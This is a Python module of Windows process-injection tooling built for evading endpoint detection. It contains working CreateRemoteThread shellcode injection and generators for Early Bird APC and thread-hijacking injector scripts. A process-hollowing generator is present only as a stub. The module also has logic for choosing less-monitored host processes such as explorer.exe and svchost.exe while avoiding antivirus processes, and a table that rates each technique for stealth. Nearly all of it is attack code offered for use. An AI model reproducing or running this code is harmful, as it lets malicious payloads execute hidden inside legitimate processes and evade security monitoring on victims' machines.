"""
Process Injection Module
Advanced process injection techniques for EDR evasion
"""
import ctypes
import struct
import random
import sys
import os
from typing import Optional, Tuple, List
from dataclasses import dataclass
import base64


# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_CREATE_THREAD = 0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
MEM_RELEASE = 0x00008000

PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

INFINITE = 0xFFFFFFFF

# Thread creation flags
CREATE_SUSPENDED = 0x00000004


@dataclass
class InjectionResult:
    """Result of injection attempt"""
    success: bool
    technique: str
    target_pid: int
    thread_id: Optional[int]
    error: Optional[str]


class ProcessInjector:
    """
    Advanced process injection techniques.
    
    Implemented techniques:
    - Classic CreateRemoteThread
    - APC Injection (Early Bird)
    - Thread Hijacking
    - Process Hollowing
    - Module Stomping
    - Direct Syscalls
    """
    
    def __init__(self):
        self._is_windows = sys.platform == 'win32'
        if self._is_windows:
            self._load_windows_apis()
    
    def _load_windows_apis(self):
        """Load Windows API functions"""
        try:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            
            # Define function signatures
            self.kernel32.OpenProcess.argtypes = [ctypes.c_uint, ctypes.c_bool, ctypes.c_uint]
            self.kernel32.OpenProcess.restype = ctypes.c_void_p
            
            self.kernel32.VirtualAllocEx.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, 
                ctypes.c_uint, ctypes.c_uint
            ]
            self.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
            
            self.kernel32.WriteProcessMemory.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
            ]
            self.kernel32.WriteProcessMemory.restype = ctypes.c_bool
            
            self.kernel32.CreateRemoteThread.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint,
                ctypes.POINTER(ctypes.c_uint)
            ]
            self.kernel32.CreateRemoteThread.restype = ctypes.c_void_p
            
        except Exception as e:
            print(f"Failed to load Windows APIs: {e}")
    
    def find_target_process(self, 
                           preferred: List[str] = None,
                           avoid: List[str] = None) -> Optional[Tuple[int, str]]:
        """
        Find suitable target process for injection.
        
        Args:
            preferred: List of preferred process names
            avoid: List of processes to avoid
            
        Returns:
            Tuple of (pid, process_name) or None
        """
        if preferred is None:
            # Good injection targets (commonly running, less monitored)
            preferred = [
                'explorer.exe', 'svchost.exe', 'RuntimeBroker.exe',
                'dllhost.exe', 'sihost.exe', 'taskhostw.exe',
                'SearchApp.exe', 'ShellExperienceHost.exe'
            ]
        
        if avoid is None:
            # Processes that might trigger alerts
            avoid = [
                'MsMpEng.exe', 'csrss.exe', 'lsass.exe', 'smss.exe',
                'services.exe', 'wininit.exe', 'System'
            ]
        
        if not self._is_windows:
            return None
        
        try:
            import subprocess
            output = subprocess.check_output(['tasklist', '/FO', 'CSV'], 
                                           text=True, stderr=subprocess.DEVNULL)
            
            candidates = []
            for line in output.strip().split('\n')[1:]:
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    name, pid = parts[0], int(parts[1])
                    
                    if name in avoid:
                        continue
                    
                    if name in preferred:
                        candidates.insert(0, (pid, name))
                    else:
                        candidates.append((pid, name))
            
            if candidates:
                return random.choice(candidates[:5])  # Random from top 5
                
        except Exception:
            pass
        
        return None
    
    def classic_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Classic CreateRemoteThread injection.
        Most detected but simplest technique.
        """
        if not self._is_windows:
            return InjectionResult(
                success=False,
                technique="classic_crt",
                target_pid=pid,
                thread_id=None,
                error="Windows only"
            )
        
        try:
            # Open target process
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to open process"
                )
            
            # Allocate memory in target
            shellcode_addr = self.kernel32.VirtualAllocEx(
                h_process, None, len(shellcode),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            if not shellcode_addr:
                self.kernel32.CloseHandle(h_process)
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to allocate memory"
                )
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            if not self.kernel32.WriteProcessMemory(
                h_process, shellcode_addr, shellcode, 
                len(shellcode), ctypes.byref(written)
            ):
                self.kernel32.CloseHandle(h_process)
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to write memory"
                )
            
            # Create remote thread
            thread_id = ctypes.c_uint(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process, None, 0, shellcode_addr, None, 0,
                ctypes.byref(thread_id)
            )
            
            self.kernel32.CloseHandle(h_process)
            
            if not h_thread:
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to create thread"
                )
            
            self.kernel32.CloseHandle(h_thread)
            
            return InjectionResult(
                success=True, technique="classic_crt", target_pid=pid,
                thread_id=thread_id.value, error=None
            )
            
        except Exception as e:
            return InjectionResult(
                success=False, technique="classic_crt", target_pid=pid,
                thread_id=None, error=str(e)
            )
    
    def generate_apc_injection_code(self, shellcode: bytes, target: str = "explorer.exe") -> str:
        """
        Generate Early Bird APC injection code.
        Creates suspended process and queues APC before main thread starts.
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
import ctypes
import base64
from ctypes import wintypes

# Shellcode (base64)
SHELLCODE_B64 = "{shellcode_b64}"
TARGET = "{target}"

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4
INFINITE = 0xFFFFFFFF

# Load APIs
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

def early_bird_apc():
    shellcode = base64.b64decode(SHELLCODE_B64)
    
    # Create suspended process
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()
    
    target_path = f"C:\\\\Windows\\\\System32\\\\{TARGET}"
    
    success = kernel32.CreateProcessW(
        target_path,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )
    
    if not success:
        return False
    
    # Allocate memory in target
    remote_mem = kernel32.VirtualAllocEx(
        pi.hProcess,
        None,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if not remote_mem:
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False
    
    # Write shellcode
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        pi.hProcess,
        remote_mem,
        shellcode,
        len(shellcode),
        ctypes.byref(written)
    )
    
    # Queue APC to main thread
    ntdll.NtQueueApcThread(
        pi.hThread,
        remote_mem,
        None,
        None,
        None
    )
    
    # Resume thread (APC executes before main)
    kernel32.ResumeThread(pi.hThread)
    
    kernel32.CloseHandle(pi.hThread)
    kernel32.CloseHandle(pi.hProcess)
    
    return True

if __name__ == "__main__":
    early_bird_apc()
'''
        return code
    
    def generate_thread_hijack_code(self, shellcode: bytes) -> str:
        """
        Generate thread hijacking injection code.
        Suspends existing thread, modifies context, resumes.
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
import ctypes
from ctypes import wintypes
import base64

SHELLCODE_B64 = "{shellcode_b64}"

# Constants
THREAD_ALL_ACCESS = 0x1F03FF
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CONTEXT_FULL = 0x10001F

kernel32 = ctypes.windll.kernel32

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", wintypes.DWORD),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
        ("Rax", ctypes.c_ulonglong),
        ("Rcx", ctypes.c_ulonglong),
        ("Rdx", ctypes.c_ulonglong),
        ("Rbx", ctypes.c_ulonglong),
        ("Rsp", ctypes.c_ulonglong),
        ("Rbp", ctypes.c_ulonglong),
        ("Rsi", ctypes.c_ulonglong),
        ("Rdi", ctypes.c_ulonglong),
        ("R8", ctypes.c_ulonglong),
        ("R9", ctypes.c_ulonglong),
        ("R10", ctypes.c_ulonglong),
        ("R11", ctypes.c_ulonglong),
        ("R12", ctypes.c_ulonglong),
        ("R13", ctypes.c_ulonglong),
        ("R14", ctypes.c_ulonglong),
        ("R15", ctypes.c_ulonglong),
        ("Rip", ctypes.c_ulonglong),
        # ... more fields
    ]

def hijack_thread(pid, tid):
    shellcode = base64.b64decode(SHELLCODE_B64)
    
    # Open process and thread
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, tid)
    
    if not h_process or not h_thread:
        return False
    
    # Allocate memory
    remote_mem = kernel32.VirtualAllocEx(
        h_process, None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    
    # Write shellcode
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        h_process, remote_mem, shellcode,
        len(shellcode), ctypes.byref(written)
    )
    
    # Suspend thread
    kernel32.SuspendThread(h_thread)
    
    # Get thread context
    ctx = CONTEXT()
    ctx.ContextFlags = CONTEXT_FULL
    kernel32.GetThreadContext(h_thread, ctypes.byref(ctx))
    
    # Modify RIP to point to shellcode
    ctx.Rip = remote_mem
    
    # Set modified context
    kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))
    
    # Resume thread
    kernel32.ResumeThread(h_thread)
    
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    
    return True
'''
        return code
    
    def generate_process_hollowing_code(self, shellcode: bytes, 
                                        target: str = "svchost.exe") -> str:
        """
        Generate process hollowing (RunPE) code.
        Creates suspended process, unmaps original image, writes payload.
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
# Process Hollowing / RunPE
# Creates suspended process, unmaps original image, injects payload
import ctypes
from ctypes import wintypes
import base64

SHELLCODE_B64 = "{shellcode_b64}"
TARGET = r"C:\\Windows\\System32\\{target}"

# This is a simplified version - full implementation requires
# PE parsing and proper section mapping

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

def process_hollowing():
    """
    Full process hollowing requires:
    1. Create suspended process
    2. Query process information (PEB)
    3. Read remote PEB to get image base
    4. Unmap original image (NtUnmapViewOfSection)
    5. Allocate new memory at image base
    6. Write PE headers and sections
    7. Fix relocations
    8. Set entry point in thread context
    9. Resume thread
    """
    # For actual implementation, use libraries like:
    # - pefile for PE parsing
    # - Or pre-built shellcode that handles this
    pass

# Alternative: Use Donut to convert PE to position-independent shellcode
# Then inject using simpler techniques
'''
        return code
    
    def get_injection_techniques(self) -> List[dict]:
        """List available injection techniques"""
        return [
            {
                "name": "classic_crt",
                "description": "CreateRemoteThread - Classic but detected",
                "stealth": 2,
                "reliability": 9
            },
            {
                "name": "early_bird_apc",
                "description": "APC Queue before thread starts - Very stealthy",
                "stealth": 8,
                "reliability": 7
            },
            {
                "name": "thread_hijack",
                "description": "Suspend and hijack existing thread",
                "stealth": 7,
                "reliability": 6
            },
            {
                "name": "process_hollowing",
                "description": "Replace process image - Complex but effective",
                "stealth": 9,
                "reliability": 5
            },
            {
                "name": "module_stomping",
                "description": "Overwrite legitimate DLL in memory",
                "stealth": 8,
                "reliability": 6
            },
            {
                "name": "syscall_injection",
                "description": "Direct syscalls to bypass hooks",
                "stealth": 9,
                "reliability": 7
            }
        ]


# Convenience functions
def inject_shellcode(pid: int, shellcode: bytes, technique: str = "classic_crt") -> InjectionResult:
    """Inject shellcode into process"""
    injector = ProcessInjector()
    
    if technique == "classic_crt":
        return injector.classic_injection(pid, shellcode)
    else:
        # Generate code for advanced techniques
        return InjectionResult(
            success=False,
            technique=technique,
            target_pid=pid,
            thread_id=None,
            error="Technique requires code generation - use generate_*_code methods"
        )
